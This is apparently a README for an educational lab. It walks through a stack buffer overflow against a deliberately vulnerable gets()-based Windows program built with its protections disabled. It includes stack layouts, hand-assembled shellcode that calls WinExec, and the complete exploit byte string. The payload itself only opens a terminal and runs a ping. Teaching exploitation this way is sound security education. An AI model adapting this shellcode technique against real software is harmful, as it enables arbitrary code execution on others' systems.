## Table of Contents
- [Overview](#overview)
- [Basic Exploit Structure](#basic-exploit-structure)
- [Crafting the Exploit - Loading the Command String into Memory](#crafting-the-exploit---loading-the-command-string-into-memory)
- [Crafting the Exploit - Calling WinExec](#crafting-the-exploit---calling-winexec)
- [Crafting the Exploit - Final Touches](#crafting-the-exploit---final-touches)


## Overview
This project demonstrates a simple buffer overflow attack. The vulnerable program reads a string from the user and then prints it back. However, the function used for reading user input, ```gets()```, does not verify whether the buffer is large enough for a given input, making it vulnerable to buffer overflow. This attack works on x86 Windows with ASLR, stack canaries and non-executable stack disabled. The project includes three files:
- ```vulnerable.c``` is the target of the attack
- ```exploit.bin``` is the input we will give to the vulnerable program to execute our code (our goal will be to open a new terminal window and ping google)
- ```getAddr.c``` is a helper program that will print the address of the function ```WinExec``` (its usefulnes will be apparent later)

The following is a detailed description of how the exploit was developed. I used OllyDbg throughout this project.

## Basic Exploit Structure
Having identified a vulnerable input in our program, we need to first analyze what the stack looks like before we enter our input. This is a diagram of the stack layout after the prolog of ```main```
```
address   value  
0019FEF0  0019FF08 - the start of the input buffer   <= ESP

...

0019FF2C  0019FF74 - saved EBP                       <= EBP  
0019FF30  00401279 - return address  
0019FF34  00000001 - argc 
0019FF38  005DCA48 - argv
```
```ESP``` is pointing to the start of the buffer (```0x0019FEF0```) and ```EBP``` is pointing to the ```saved EBP``` (```0x0019FF74```). It is worth noting that ```ESP``` will be pointing to ```argc``` (```0x0019FF34```) after returning from ```main```.

The rough idea of our exploit is to write the code into the buffer and then overwrite the ```return address``` with the address of our code. This will cause the ```ret``` instruction at the end of the function to execute our code. The buffer has 60B and we also need to overwrite the ```saved EBP``` to get to the ```return address```, so our exploit needs to be 68B long. The first 64B can be shellcode and the last 4 bytes need to be the address, where we want to redirect execution. We have to add padding if our shellcode is not long enough to exactly match this length. Overall, the exploit needs to have the following format
```
|  shellcode & padding   |  shellcode address
|          64B           |       4B
```
We should note now that our input cannot include arbitrary bytes.  CPP reference ([https://en.cppreference.com/w/c/io/gets](url)) states that ```gets``` loads input until it reaches either ```0x0A``` ('\n') or ```0x1A``` (EOF). Our exploit therefore cannot contain these bytes. Another limitation arises from our input method - we would not be able to enter ```0x08``` (backspace) and ```0x00``` if we were to write the exploit directly into the console. However, this can be overcome by writing the exploit into a binary file and then sending it into the input of the vulnerable program.

## Crafting the Exploit - Loading the Command String into Memory 

Let us now consider what the shellcode will actually look like. Our goal is to open a new terminal window and run ```ping 8.8.8.8```. This can be done by calling ```WinExec``` with ```cmd /k start cmd /k ping 8.8.8.8``` as its first argument. The second argument to ```WinExec``` will be 1 (``SW_NORMAL``). The first thing we need to do is to store the first argument as a null terminated string in memory. This can be done easily by making it the first part of our shellcode. The string itself looks like this
```
63 6D 64 20 2F 6B 20 73 74 61 72 74 20 63 6D 64 
20 2F 6B 20 70 69 6E 67 20 38 2E 38 2E 38 2E 38
```
Now we need to add a null byte to the end. We could just write it there in our exploit file, but that would make the exploit unusable if we were to type it directly into a console. A more universal solution is to add four bytes of padding to the end of the string and then overwrite that padding with null bytes in our code. The beginning of our exploit will therefore be 
```
63 6D 64 20 2F 6B 20 73 74 61 72 74 20 63 6D 64 
20 2F 6B 20 70 69 6E 67 20 38 2E 38 2E 38 2E 38
61 61 61 61
| padding |
```
This is what the stack will look like once our exploit has been loaded into memory
```
address   value
0019FEF0  636D6420 - the beginning of our buffer   <= ESP
0019FEF4  2F6B2073
0019FEF8  74617274
0019FEFC  20636D64
0019FF00  202F6B20
0019FF04  70696E67
0019FF08  20382E38
0019FF0C  2E382E38
0019FF10  61616161 - padding

...

0019FF2C  0019FF74 - saved EBP                     <= EBP
0019FF30  00401279 - return address
0019FF34  00000001 - argc 
0019FF38  005DCA48 - argv
```

We can see that we need to write ```0x00000000``` to the address ```0x0019FF10``` and we need to do this without using an instruction that would itself contain a null byte. In particular, we cannot directly write the address we are trying to write to. Fortunately, we can calculate the address using ```ESP```. ```ESP``` will be pointing to ```argc``` (```0x0019FF34```) after the program returns from ```main``` and starts executing our code, meaning that the target address can be calculated as ```ESP - 0x24```. In summary, we can write the required null bytes using the following instructions

```
shellcode     assembly
33C0          XOR EAX, EAX                   - zero out eax
894424 DC     MOV DWORD PTR[ESP - 24], EAX   - write a zero to 0x0019FF14
```

## Crafting the Exploit - Calling WinExec

Let us now consider what the stack will look like right after returning from main.

```
address   value
0019FEF0  636D6420 - the beginning of our buffer
0019FEF4  2F6B2073
0019FEF8  74617274
0019FEFC  20636D64
0019FF00  202F6B20
0019FF04  70696E67
0019FF08  20382E38
0019FF0C  2E382E38
0019FF10  61616161 - padding
0019FF14  33C08944 - first instructions of our code     <= PC
...

0019FF2C  ........ - last instructions of our code                     
0019FF30  0019FF14 - overwritten return address
0019FF34  00000001 - argc                               <= ESP
0019FF38  005DCA48 - argv
```
The next step is to push the arguments of ```WinExec``` onto the stack. The first argument we need to push is 1 and the second is the address of the command string - ```0x0019FEF0```. We use the same technique as before to avoid having to type a null byte in our exploit to store this address in ```EBX```. However, we cannot push onto the stack yet. The diagram above shows that doing so would overwrite our own code. We will solve this by subtracting a sufficiently large number from ```ESP```, thus moving the top of the stack above our code. The exact number does not matter, it only needs to be large enough for the resulting ```ESP``` to point above the beginning of the buffer. Once this is done we proceed to push the arguments we wish to pass to ```WinExec``` onto the stack.

```
shellcode        assembly
8BDC             MOV EBX,ESP - copy ESP to EBX
83EB 44          SUB EBX,44  - now EBX points to the start of the buffer, which is the address of our command string
83EC 50          SUB ESP,50  - move the stack pointer above the buffer
6A 01            PUSH 1      - push the first argument
53               PUSH EBX    - push the second argument
```

Now we need to call ```WinExec```. This function is part of ```kernel.dll```. Addresses of library functions are randomized upon being loaded into memory, but ```kernel.dll``` is included in every process running on Windows. This means that its address is only randomly assigned when the operating system starts and remains the same until shutdown. This allows us to use ```getAddr.c``` to find the address beforehand and be sure that it will be the same once we execute the vulnerable program. However, the address will be different each time we reboot our computer, so this part of the exploit needs to be manually changed for it to work. I got the address ```0x75CF4890``` during my testing. Note that the byte order of the address needs to be reversed when writing it into the exploit. This leads us to the last two instructions of our exploit.

```
shellcode        assembly
B8 75CF4890      MOV EAX,KERNEL32.WinExec - load the address of WinExec into EAX
FFD0             CALL EAX                 - call the function
```

This is the entire code:
```
33C0             XOR EAX,EAX
894424 DC        MOV DWORD PTR SS:[ESP-24],EAX
8BDC             MOV EBX,ESP
83EB 44          SUB EBX,44
83EC 50          SUB ESP,50
6A 01            PUSH 1
53               PUSH EBX
B8 9048CF75      MOV EAX,KERNEL32.WinExec
FFD0             CALL EAX
```

## Crafting the Exploit - Final Touches

We get the following exploit after adding the code to our command string.
```
63 6D 64 20 2F 6B 20 73 74 61 72 74 20 63 6D 64 
20 2F 6B 20 70 69 6E 67 20 38 2E 38 2E 38 2E 38 
61 61 61 61 33 C0 89 44 24 DC 8B DC 83 EB 44 83 
EC 50 6A 01 53 B8 90 48 CF 75 FF D0
```
This code is 60B long so we need to add 4B of padding followed by the address of our code (```0x0019FF14```). We once again encounter the issue of having to write a null byte. However, the bytes we actually need to write into the buffer are ```14 FF 19 00```. Notice that the null byte is the very last byte of our exploit. Fortunately, ```gets``` stores its input as a null terminated string, so it will write this problematic byte for us. The complete shellcode therefore looks like this
```
63 6D 64 20 2F 6B 20 73 74 61 72 74 20 63 6D 64 
20 2F 6B 20 70 69 6E 67 20 38 2E 38 2E 38 2E 38 
61 61 61 61 33 C0 89 44 24 DC 8B DC 83 EB 44 83 
EC 50 6A 01 53 B8 90 48 CF 75 FF D0 61 61 61 61
14 FF 19          |          |      |         |
|      |         WinExec address      padding
address of our code (the null byte will be written by gets)
```

Remember that it is necessary to replace the ```WinExec``` address by the address printed by ```getAddr.c```. Finally, we run the exploit using ```vulnerable < exploit.bin```.
